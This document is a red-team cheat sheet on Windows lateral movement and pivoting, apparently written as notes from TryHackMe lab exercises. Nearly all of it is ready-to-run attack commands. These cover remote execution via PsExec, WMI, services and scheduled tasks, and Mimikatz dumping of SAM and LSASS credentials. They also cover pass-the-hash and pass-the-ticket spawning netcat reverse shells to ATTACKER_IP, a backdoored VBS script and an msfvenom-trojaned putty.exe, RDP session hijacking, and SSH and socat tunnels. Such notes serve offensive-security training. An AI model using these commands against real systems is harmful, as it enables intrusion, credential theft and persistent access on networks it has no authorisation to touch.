# Lateral Movement & Pivoting

Lateral movement = group of techniques used by attackers to move around a network.

Following initial access to a machine of a network, moving is essential for many reasons, such as reaching the goal during a red team operation, bypassing network restrictions, establishing additional points of entry to the network, avoiding detection, etc.

Lateral movement is part of a cycle. During this cycle, the available credentials are used to perform lateral movement, thus obtaining access to new machines where we can escalate privileges and get additional credentials. With new credentials, the cycle continues.

## 1. Spawning Processes Remotely

### 1.1. PSexec

* Ports: 445/TCP (SMB)
* Required Group Membership: Administrators

How it works:

1. Connect to `Admin$` share and upload a service binary. Psexec uses `psexecvc.exe` as the name
2. Connect to the service control manager to create and run a service named PSEXESVC and associate the service binary with `C:\Windows\psexesvc.exe`
3. Create some named pipes to handle stdin/stdout/stderr

```bash
# run psexec from the attacking machine with the command:
$ psexec.exe MACHINE:IP -u Administrator -p Password1 -i cmd.exe
```

### 1.2. WinRM

* Ports: 5985/TCP (WinRM HTTP) or 5586/TCP (WinRM HTTPS)
* Required Group Memberships: Remote Management Users

```bash
# Connect to a remote Powershell session from the command line:
$ winrs.exe -u:Administrator -p:Password1 -r:target cmd
```

### 1.3. sc

* Ports:
	* 135/TCP, 49152-65535/TCP (DCE/RPC)
	* 445/TCP (RPC over SMB Named Pipes)
	* 139/TCP (RPC over SMB Named Pipes)
* Required Group Memberships: Administrators

```powershell
# create and start a service named "THMservice" using the commands:
> sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
> sc.exe \\TARGET start THMservice
# When this service is started, it will create a new local user on the system

# To stop and delete the service, use the commands:
> sc.exe \\TARGET stop THMservice
> sc.exe \\TARGET delete THMservice
```

### 1.4. Creating Scheduled Tasks Remotely

```powershell
# create and run a scheduled task remotely using schtasks:
> schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00
> schtasks /s TARGET /run /TN "THMtask1"
# this will create a task named THMtask1

# For cleanup purposes, we can delete the schedulet task using the command:
> schtasks /S TARGET /TN "THMtask1" /DELETE /F
```

## 2. Moving Laterally Using WMI

### 2.1. Connecting to WMI From Powershell

```powershell
# create a PSCredential object with our user and pass
> $username = 'Administrator';
> $password = 'Mypass123';
> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;

# establish a WMI session from Powershell using the commands:
> $Opt = New-CimSessionOption -Protocol DCOM
> $Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

### 2.2. Remote Process Creation Using WMI

* Ports:
	* 135/TCP, 49152-65535/TCP (DCERPC)
	* 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
* Required Group Memberships: Administrators

```powershell
# remotely spawn a process from Powershell using WMI:
> $Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";

> Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
CommandLine = $Command
}

# alternatively use wmic on legacy systems
wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create "cmd.exe /c calc.exe" 
```

### 2.3. Creating Services Remotely with WMI

* Ports:
	* 135/TCP, 49152-65535/TCP (DCERPC)
	* 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
* Required Group Memberships: Administrators

```powershell
# Create a service called THMService2 using the commands:
> Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
> Name = "THMService2";
> DisplayName = "THMService2";
> PathName = "net user munra2 Pass123 /add"; # Your payload
> ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
> StartMode = "Manual"
}

# get a handle on the service and start it with the commands:
> $Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"
> Invoke-CimMethod -InputObject $Service -MethodName StartService

# delete the service for cleanup
> Invoke-CimMethod -InputObject $Service -MethodName StopService
> Invoke-CimMethod -InputObject $Service -MethodName Delete
```

### 2.4. Creating Scheduled Tasks Remotely with WMI

* Ports:
	* 135/TCP, 49152-65535/TCP (DCERPC)
	* 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
* Required Group Memberships: Administrators

```powershell
# Payload must be split in Comand and Args
> $Command = "cmd.exe"
> $Args = "/c net user munra22 aSdf1234 /add"

> $Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Arguments $Args
> Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"
> Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"

# delete the scheduled task for cleanup
> Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```

### 2.5. Installing MSI packages through WMI

* Ports:
	* 135/TCP, 49152-65535/TCP (DCERPC)
	* 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
* Required Group Memberships: Administrators

```powershell
# once the MSI file is in the target system, install it with the command:
> Invoke-CimMethod -CimSession $Session -ClassName Win32_product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
# or using wmic in legacy systems
> wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi
```

## 3. Use of Alternate Authentication Material

### 3.1. NTLM Authentication

#### 3.1.1. Pass-the-Hash

* On the victim Windows machine:

```powershell
# Mimikatz

# extract NTLM hashes from the local SAM
> privilege::debug
> token::elevate
> lsadump::sam

# extract NTLM hashes from LSASS memory
> privilege::debug
> token::elevate
> sekurlsa::msv

# use the extracted hashes to perform a pass the hash attack
# by using mimikatz to inject an access token for the victim user on a reverse shell
> token::revert
> sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"
```

* On the attacker machine - start a listener to receive the reverse shell:

```bash
$ nc -lvp 5555
```

Passing the hash - different tools have built-in support using different protocols:

```bash
# connect to RDP using PtH:
$ xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH

# connect via psexec using PtH:
$ psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP

# connect to WinRM using PtH:
$ evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH
```

### 3.2. Kerberos Authentication

#### 3.2.1. Pass-the-Ticket

```powershell
# mimikatz
> privilege::debug
> sekurlsa::tickets /export

> kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi

# check if tickets were correctly injected after exiting mimikatz and using cmd:
> klist
```

#### 3.2.2. Overpass-the-hash / Pass-the-Key

* On the victim Windows machine:

```powershell
# mimikatz

# obtain the kerberos encryption keys from memory
> privilege::debug
> sekurlsa::ekeys

# if we have the RC4 hash:
> sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"

# if we have the AES128 hash:
> sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"

# if we have the AES256 hash
> sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

* On the attacker machine - start a listener to receive the reverse shell:

```bash
$ nc -lvp 5556
```

## 4. Abusing User Behaviour

Abusing Writable Shares = find a shortcut to a script or executable file hosted on a network share

### 4.1. Backdooring .vbs Scripts

```powershell
# if the shared resource is a VBS script, we can put a copy of nc64.exe on the same share and inject the code into the script:
> CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\10.10.28.6\myshare\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe ATTACKER_IP 1234", 0, True
# this will send a reverse shell to the attacker
```

### 4.2. Backdooring .exe Files

```powershell
# example: create a backdoored putty.exe
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o puttyX.exe
# replace the executable on the windows share with the backdoored one
```

### 4.3. RDP hijacking

```powershell
# Open command prompt as administrator and run the command below:
> PsExec64.exe -s cmd.exe
> query user
# this will show the session the administrator is logged in via rdp

# Hijack the session using the command
> tscon 3 /dest:rdp-tcp#6
```

## 5. Port Forwarding

### 5.1. SSH Tunneling

```bash
# SSH tunneling - Start a tunnel from the compromised PC-1 machine, acting as a SSH client, to the attacker PC which will act as an SSH server
# with this tunnel we can reach other devices on the network such as Server (3.3.3.3)

# create a user without access to any console for tunneling
# and set a password to use for creating the tunnels
$ useradd tunneluser -m -d /home/tunneluser -s /bin/true
$ passwd tunneluser
```

#### 5.1.1 SSH Remote Port Forwarding

```powershell
# on the windows victim machine run:
> ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389
# this will establish a SSH session from PC1 to Attacker PC (1.1.1.1) using the tunneluser user
# with this session we can reach the server (3.3.3.3)
# the ports do not need to match
```

* With the tunnel set we can go to the attacker machine and RDP into the forwarded port to reach the server:

```bash
$ xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPassword
```

#### 5.1.2. SSH Local Port Forwarding

* Run the following command on the victim Windows PC:

```bash
# forward port 80 from the attacker's machine and make it available from PC-1
> ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N
```

* On the attacker machine - add the required firewall rule:

```bash
$ netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80
```

### 5.2. Port Forwarding with socat

* If we wanted to access port 3389 on the server using PC-1 as a pivot as we did with SSH remote port forwarding, we could use the following command on the victim machine:

```powershell
> socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389
```

* On the attacker machine - add the required firewall rule:

```bash
$ netsh advfirewall firewall add rule name="Open Port 3389" dir=in action=allow protocol=TCP localport=3389
```

### 5.3. Dynamic Port Forwarding and SOCKS

```bash
$ ssh tunneluser@1.1.1.1 -R 9050 -N
# the SSH server will start a SOCKS proxy on port 9050 and forward any connection request through the SSH tunnel, where they are finally proxied by the SSH client

# we can use any of our tools through the SOCKS proxy by using proxychains
# first edit the file /etc/proxychains.conf
[ProxyList]
socks4 127.0.0.1 9050
# make sure the port is the same as in the ssh command

# can now use any tools through the proxy using proxychains
$ proxychains curl http://pxeboot.za.tryhackme.com
```